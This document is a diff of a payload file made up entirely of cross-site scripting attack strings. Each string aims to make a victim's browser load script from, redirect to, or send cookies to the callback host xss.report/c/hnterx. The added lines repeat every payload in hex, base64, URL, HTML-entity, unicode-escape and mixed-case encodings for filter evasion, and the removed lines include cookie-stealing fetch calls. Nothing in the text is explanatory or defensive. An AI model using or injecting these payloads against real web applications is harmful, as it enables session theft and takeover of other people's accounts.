@@ -1,11 +1,50 @@
-'"><script src=https://xss.report/c/hnterx></script>
-'"<svg/onload="window.location.href='https://xss.report/c/hnterx'">
-<input autofocus onfocus="fetch('https://xss.report/c/hnterx?token='+document.cookie)"//>
-<textarea onfocus="fetch('https://xss.report/c/hnterx').then(r=>r.text()).then(eval)">Focus me</textarea>
-javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/hnterx?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
-<img src=x onerror=fetch('https://xss.report/c/hnterx?c='+document.cookie)>
-'"<svg/onload="fetch('https://xss.report/c/hnterx'">
-'"<svg/onload='var a="fetch";var b="https://xss.report/c/hnterx"; setTimeout(a+"(b)",1000)'>
-'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/hnterx")></script>
-'"?><svg/onload="fetch('https://xss.report/c/hnterx?cookie='+document.cookie)"//>
-'"><Svg Src=//xss.report/c/hnterx/s OnLoad=import(this.getAttribute('src')+0)>
+'"><script src=https://xss.report/c/hnterx?1></script>
+27223e3c736372697074207372633d68747470733a2f2f7873732e7265706f72742f632f686e746572783f313e3c2f7363726970743e
+&apos;&quot;&gt;&lt;script src=https://xss.report/c/hnterx?1&gt;&lt;/script&gt;
+%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F1%3E%3C%2Fscript%3E
+JyI+PHNjcmlwdCBzcmM9aHR0cHM6Ly94c3MucmVwb3J0L2MvaG50ZXJ4PzE+PC9zY3JpcHQ+
+\u0027\u0022\u003E\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0031\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
+'"><sCrIpT sRc=hTtPs://xSs.rEpOrT/C/HnTeRx?1></sCrIpT>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\hnterx?9/.source))//>
+6a6176617363726970743a222f2a272f2a602f2a2d2d3e3c2f6e6f7363726970743e3c2f7469746c653e3c2f74657874617265613e3c2f7374796c653e3c2f74656d706c6174653e3c2f6e6f656d6265643e3c2f7363726970743e3c68746d6c2022206f6e6d6f7573656f7665723d2f2a266c743b7376672f2a2f6f6e6c6f61643d28696d706f7274282f68747470733a5c7873732e7265706f72745c635c686e746572783f392f2e736f7572636529292f2f3e
+javascript:&quot;/*&apos;/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html &quot; onmouseover=/*&amp;lt;svg/*/onload=(import(/https:\xss.report\c\hnterx?9/.source))//&gt;
+javascript%3A%22%2F%2A%27%2F%2A%60%2F%2A--%3E%3C%2Fnoscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fstyle%3E%3C%2Ftemplate%3E%3C%2Fnoembed%3E%3C%2Fscript%3E%3Chtml%20%22%20onmouseover%3D%2F%2A%26lt%3Bsvg%2F%2A%2Fonload%3D%28import%28%2Fhttps%3A%5Cxss.report%5Cc%5Chnterx%3F9%2F.source%29%29%2F%2F%3E
+amF2YXNjcmlwdDoiLyonLypgLyotLT48L25vc2NyaXB0PjwvdGl0bGU+PC90ZXh0YXJlYT48L3N0eWxlPjwvdGVtcGxhdGU+PC9ub2VtYmVkPjwvc2NyaXB0PjxodG1sICIgb25tb3VzZW92ZXI9LyombHQ7c3ZnLyovb25sb2FkPShpbXBvcnQoL2h0dHBzOlx4c3MucmVwb3J0XGNcaG50ZXJ4PzkvLnNvdXJjZSkpLy8+
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0022\u002F\u002A\u0027\u002F\u002A\u0060\u002F\u002A\u002D\u002D\u003E\u003C\u002F\u006E\u006F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u003C\u002F\u0074\u0069\u0074\u006C\u0065\u003E\u003C\u002F\u0074\u0065\u0078\u0074\u0061\u0072\u0065\u0061\u003E\u003C\u002F\u0073\u0074\u0079\u006C\u0065\u003E\u003C\u002F\u0074\u0065\u006D\u0070\u006C\u0061\u0074\u0065\u003E\u003C\u002F\u006E\u006F\u0065\u006D\u0062\u0065\u0064\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u003C\u0068\u0074\u006D\u006C\u0020\u0022\u0020\u006F\u006E\u006D\u006F\u0075\u0073\u0065\u006F\u0076\u0065\u0072\u003D\u002F\u002A\u0026\u006C\u0074\u003B\u0073\u0076\u0067\u002F\u002A\u002F\u006F\u006E\u006C\u006F\u0061\u0064\u003D\u0028\u0069\u006D\u0070\u006F\u0072\u0074\u0028\u002F\u0068\u0074\u0074\u0070\u0073\u003A\u005C\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u005C\u0063\u005C\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0039\u002F\u002E\u0073\u006F\u0075\u0072\u0063\u0065\u0029\u0029\u002F\u002F\u003E
+jAvAsCrIpT:"/*'/*`/*--></NoScRiPt></tItLe></tExTaReA></StYlE></TeMpLaTe></nOeMbEd></sCrIpT><hTmL " OnMoUsEoVeR=/*&lT;SvG/*/OnLoAd=(ImPoRt(/HtTpS:\xSs.rEpOrT\C\HnTeRx?9/.SoUrCe))//>
+'"<img src=x onerror='this.src="https://xss.report/c/hnterx?11"'>
+27223c696d67207372633d78206f6e6572726f723d27746869732e7372633d2268747470733a2f2f7873732e7265706f72742f632f686e746572783f313122273e
+&apos;&quot;&lt;img src=x onerror=&apos;this.src=&quot;https://xss.report/c/hnterx?11&quot;&apos;&gt;
+%27%22%3Cimg%20src%3Dx%20onerror%3D%27this.src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F11%22%27%3E
+JyI8aW1nIHNyYz14IG9uZXJyb3I9J3RoaXMuc3JjPSJodHRwczovL3hzcy5yZXBvcnQvYy9obnRlcng/MTEiJz4=
+\u0027\u0022\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0027\u0074\u0068\u0069\u0073\u002E\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0031\u0031\u0022\u0027\u003E
+'"<svg/onload="window.location.href='https://xss.report/c/hnterx?25'">
+27223c7376672f6f6e6c6f61643d2277696e646f772e6c6f636174696f6e2e687265663d2768747470733a2f2f7873732e7265706f72742f632f686e746572783f323527223e
+&apos;&quot;&lt;svg/onload=&quot;window.location.href=&apos;https://xss.report/c/hnterx?25&apos;&quot;&gt;
+%27%22%3Csvg%2Fonload%3D%22window.location.href%3D%27https%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F25%27%22%3E
+JyI8c3ZnL29ubG9hZD0id2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8yNSciPg==
+\u0027\u0022\u003C\u0073\u0076\u0067\u002F\u006F\u006E\u006C\u006F\u0061\u0064\u003D\u0022\u0077\u0069\u006E\u0064\u006F\u0077\u002E\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E\u002E\u0068\u0072\u0065\u0066\u003D\u0027\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0032\u0035\u0027\u0022\u003E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/hnterx?23"></scrIpt>
+2d2d3e3c2f7469546c653e3c2f7374596c653e3c2f74657854617265613e3c2f7363724970743e222f2f272f2f3e3c736372497074207372633d2268747470733a2f2f7873732e7265706f72742f632f686e746572783f3233223e3c2f7363724970743e
+--&gt;&lt;/tiTle&gt;&lt;/stYle&gt;&lt;/texTarea&gt;&lt;/scrIpt&gt;&quot;//&apos;//&gt;&lt;scrIpt src=&quot;https://xss.report/c/hnterx?23&quot;&gt;&lt;/scrIpt&gt;
+LS0+PC90aVRsZT48L3N0WWxlPjwvdGV4VGFyZWE+PC9zY3JJcHQ+Ii8vJy8vPjxzY3JJcHQgc3JjPSJodHRwczovL3hzcy5yZXBvcnQvYy9obnRlcng/MjMiPjwvc2NySXB0Pg==
+\u002D\u002D\u003E\u003C\u002F\u0074\u0069\u0054\u006C\u0065\u003E\u003C\u002F\u0073\u0074\u0059\u006C\u0065\u003E\u003C\u002F\u0074\u0065\u0078\u0054\u0061\u0072\u0065\u0061\u003E\u003C\u002F\u0073\u0063\u0072\u0049\u0070\u0074\u003E\u0022\u002F\u002F\u0027\u002F\u002F\u003E\u003C\u0073\u0063\u0072\u0049\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0032\u0033\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0049\u0070\u0074\u003E
+'"<iframe srcdoc='<script>window.location="https://xss.report/c/hnterx?14"</script>'></iframe>
+27223c696672616d6520737263646f633d273c7363726970743e77696e646f772e6c6f636174696f6e3d2268747470733a2f2f7873732e7265706f72742f632f686e746572783f3134223c2f7363726970743e273e3c2f696672616d653e
+&apos;&quot;&lt;iframe srcdoc=&apos;&lt;script&gt;window.location=&quot;https://xss.report/c/hnterx?14&quot;&lt;/script&gt;&apos;&gt;&lt;/iframe&gt;
+%27%22%3Ciframe%20srcdoc%3D%27%3Cscript%3Ewindow.location%3D%22https%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F14%22%3C%2Fscript%3E%27%3E%3C%2Fiframe%3E
+JyI8aWZyYW1lIHNyY2RvYz0nPHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeD8xNCI8L3NjcmlwdD4nPjwvaWZyYW1lPg==
+\u0027\u0022\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u0064\u006F\u0063\u003D\u0027\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0077\u0069\u006E\u0064\u006F\u0077\u002E\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0031\u0034\u0022\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0027\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E
+javascript:fetch("https://xss.report/c/hnterx?32")
+6a6176617363726970743a6665746368282268747470733a2f2f7873732e7265706f72742f632f686e746572783f33322229
+javascript:fetch(&quot;https://xss.report/c/hnterx?32&quot;)
+javascript%3Afetch%28%22https%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F32%22%29
+amF2YXNjcmlwdDpmZXRjaCgiaHR0cHM6Ly94c3MucmVwb3J0L2MvaG50ZXJ4PzMyIik=
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0066\u0065\u0074\u0063\u0068\u0028\u0022\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0033\u0032\u0022\u0029
+'"></script></title></textarea><script src=//https://xss.report/c/hnterx?36></script>
+27223e3c2f7363726970743e3c2f7469746c653e3c2f74657874617265613e3c736372697074207372633d2f2f68747470733a2f2f7873732e7265706f72742f632f686e746572783f33363e3c2f7363726970743e
+&apos;&quot;&gt;&lt;/script&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;script src=//https://xss.report/c/hnterx?36&gt;&lt;/script&gt;
+%27%22%3E%3C%2Fscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%2F%2Fhttps%3A%2F%2Fxss.report%2Fc%2Fhnterx%3F36%3E%3C%2Fscript%3E
+JyI+PC9zY3JpcHQ+PC90aXRsZT48L3RleHRhcmVhPjxzY3JpcHQgc3JjPS8vaHR0cHM6Ly94c3MucmVwb3J0L2MvaG50ZXJ4PzM2Pjwvc2NyaXB0Pg==
+\u0027\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u003C\u002F\u0074\u0069\u0074\u006C\u0065\u003E\u003C\u002F\u0074\u0065\u0078\u0074\u0061\u0072\u0065\u0061\u003E\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u002F\u002F\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0078\u0073\u0073\u002E\u0072\u0065\u0070\u006F\u0072\u0074\u002F\u0063\u002F\u0068\u006E\u0074\u0065\u0072\u0078\u003F\u0033\u0036\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/hnterx?49"></scrIpt>
